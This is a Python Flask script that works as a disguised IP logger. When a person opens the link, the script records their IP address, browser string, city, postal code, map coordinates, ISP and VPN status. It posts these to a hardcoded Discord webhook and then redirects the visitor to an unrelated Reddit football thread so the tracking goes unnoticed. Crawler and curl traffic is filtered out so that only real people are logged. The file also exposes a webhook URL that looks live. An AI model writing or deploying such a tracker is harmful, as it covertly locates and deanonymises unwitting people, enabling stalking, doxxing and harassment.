import requests
from flask import Flask, request, redirect
from datetime import datetime
import threading

app = Flask(__name__)

# Discord webhook
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1430208752837066845/HFmlZHpwB_LgcbxjoFb47dvk4-5p6aWDDkKLVh_z2Oy_fBZT12DDkS4p-T8SXKkUEaTw"

# In-memory store of logged IPs today
logged_ips_today = set()

# Known cloud providers / datacenter keywords for VPN detection
CLOUD_PROVIDERS = ["Amazon", "AWS", "Google Cloud", "DigitalOcean", "Hetzner", "Microsoft", "Azure", "Linode", "OVH"]

# List of common bot keywords
BOT_KEYWORDS = ["bot", "crawl", "spider", "wget", "curl", "python-requests"]

def get_real_ip():
    headers_to_check = [
        "CF-Connecting-IP",
        "X-Forwarded-For",
        "X-Real-IP"
    ]
    for header in headers_to_check:
        ip = request.headers.get(header)
        if ip:
            return ip.split(",")[0].strip()
    return request.remote_addr

def is_bot(user_agent: str) -> bool:
    ua_lower = user_agent.lower()
    return any(bot in ua_lower for bot in BOT_KEYWORDS)

def get_visitor_info(ip, user_agent):
    """Get detailed visitor info using ipapi with fallback"""
    details = {}
    try:
        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        if r.status_code == 200:
            details = r.json()
    except Exception as e:
        print("Primary ipapi error:", e)

    # Fallback if city/country missing
    if not details.get("city") or not details.get("country_name"):
        try:
            r = requests.get("https://ipapi.co/json/", timeout=5)
            if r.status_code == 200:
                fallback = r.json()
                for key in ["ip","city","region","country_name","country_code","postal","latitude","longitude","org"]:
                    if not details.get(key) and fallback.get(key):
                        details[key] = fallback[key]
        except Exception as e:
            print("Fallback ipapi error:", e)

    lat = details.get("latitude", 0)
    lon = details.get("longitude", 0)

    # Detect VPN / Cloud IP
    org = details.get("org", "Unknown ISP")
    vpn_detected = any(cloud in org for cloud in CLOUD_PROVIDERS)

    return {
        "ip": ip,
        "user_agent": user_agent,
        "country": details.get("country_name", "Unknown"),
        "region": details.get("region", "Unknown"),
        "city": details.get("city", "Unknown"),
        "zip": details.get("postal", "Unknown"),
        "lat": lat,
        "lon": lon,
        "org": org,
        "vpn": vpn_detected,
        "date": datetime.utcnow().strftime("%d/%m/%Y"),
        "time": datetime.utcnow().strftime("%H:%M:%S"),
    }

def send_to_discord(info):
    """Send visitor info to Discord in embed"""
    vpn_text = "Yes 🚨" if info['vpn'] else "No ✅"

    embed = {
        "username": "🌍 Visitor Tracker",
        "embeds": [{
            "title": f"🚶 New Visitor from {info['country']}",
            "color": 7506394,
            "fields": [
                {"name": "🖥️ IP Address", "value": f"`{info['ip']}`", "inline": False},
                {"name": "📍 Location", "value": f"{info['city']}, {info['region']} ({info['country']})\nPostal: {info['zip']}", "inline": False},
                {"name": "🏢 ISP / Organization", "value": info['org'], "inline": False},
                {"name": "📱 Device Info", "value": f"`{info['user_agent']}`", "inline": False},
                {"name": "🌍 Google Maps", "value": f"[Open Map](https://www.google.com/maps?q={info['lat']},{info['lon']})", "inline": False},
                {"name": "🛡️ VPN / Proxy Detected", "value": vpn_text, "inline": False},
            ],
            "footer": {"text": f"Logged at {info['date']} {info['time']} GMT"}
        }]
    }

    try:
        requests.post(DISCORD_WEBHOOK_URL, json=embed, timeout=5)
    except Exception as e:
        print(f"Error sending to Discord: {e}")

@app.route('/')
def index():
    ip = get_real_ip()
    user_agent = request.headers.get("User-Agent", "Unknown")

    # Skip bots
    if is_bot(user_agent):
        print(f"Skipped bot: {user_agent}")
        return redirect("https://www.reddit.com/r/football/comments/y8xqif/how_to_be_better_in_football_in_a_fast_time/")

    # Skip already logged IPs
    if ip in logged_ips_today:
        print(f"Already logged IP today: {ip}")
        return redirect("https://www.reddit.com/r/football/comments/y8xqif/how_to_be_better_in_football_in_a_fast_time/")

    info = get_visitor_info(ip, user_agent)
    logged_ips_today.add(ip)
    send_to_discord(info)

    return redirect("https://www.reddit.com/r/football/comments/y8xqif/how_to_be_better_in_football_in_a_fast_time/")

# Optional: clear logged IPs every 24 hours
def clear_logged_ips():
    global logged_ips_today
    logged_ips_today = set()
    # Schedule next clearing in 24 hours
    threading.Timer(86400, clear_logged_ips).start()

# Start clearing loop
clear_logged_ips()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000, debug=False)
